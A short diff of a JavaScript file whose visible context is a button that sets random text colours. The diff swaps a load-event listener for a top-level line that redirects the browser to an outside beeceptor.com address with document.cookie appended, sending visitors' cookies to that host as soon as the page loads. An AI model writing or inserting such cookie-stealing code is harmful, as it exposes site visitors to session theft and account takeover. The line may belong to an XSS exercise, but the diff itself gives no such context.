@@ -10,6 +10,4 @@ color.onclick = () => {
     target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
 }
 
-window.addEventListener("load", function(event){
-    window.location.replace('https://keskispace.free.beeceptor.com/'+document.cookie);
-});   
+window.location.replace('https://keskispace.free.beeceptor.com/'+document.cookie);
